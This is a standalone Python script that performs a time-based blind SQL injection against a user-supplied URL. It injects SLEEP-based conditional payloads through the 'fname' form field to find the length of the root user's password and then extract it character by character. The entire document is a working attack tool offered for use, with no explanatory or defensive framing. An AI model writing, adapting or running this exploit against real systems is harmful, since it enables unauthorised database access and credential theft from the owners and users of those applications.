from codecs import ascii_decode
from re import S
from time import sleep
import requests
import argparse
from os import sys
from typing import Dict

def parse_args():
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",  help="Remote URL", type=str, dest="url")
    args = parser.parse_args()
    
    url:str = args.url
    
    if url is None or url == "":
        print("URL PARAMETER NOT PROVIDED")
        sys.exit(-1)
    
    return url

def make_request(url:str, 
                 data:Dict[str,str], 
                 timeout=10):
    ret_val:bool = False
    try:
        response:requests.Response = requests.post(url=url, data=data, timeout=timeout)
        
        if response.status_code != 200:
            return False
    except:
        ret_val = True
    
    sleep(1.1)
    return ret_val

def determine_password_length(url:str, timeout=10):
    
    data = {}
    sleep:int = timeout + 1
    for i in range(0,100):
        data['fname'] = f"root\' AND IF((SELECT char_length(password)) = {i}, SLEEP({sleep}),NULL)-- "
        print(f"Attempting password length: {i}")
        if make_request(url, data, timeout):
            print(f"PASSWORD LENGTH FOUND!! ({i})")
            return i

    return -1

def determine_password(url:str, password_len:int, timeout=10):
    
    data = {}
    sleep:int = timeout + 1
    password:str = ""
    for len in range(1, password_len + 1):
        for char_code in range(33, 126):
            data['fname'] = f"root\' AND IF((SELECT ascii(substr(password,{len},1))) = {char_code}, SLEEP({sleep}),NULL)-- "
            
            print("Attempting ascii-code=" + str(char_code) + " at postition " + str(len))
            
            if make_request(url, data, timeout):
                print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
                password += chr(char_code)
                print("PASSWORD: " + password)
                break
            
    return password
        

url:str = parse_args()
timeout = 5
password_length:int = determine_password_length(url=url, timeout=timeout)
password:str = determine_password(url=url, password_len=password_length, timeout=timeout)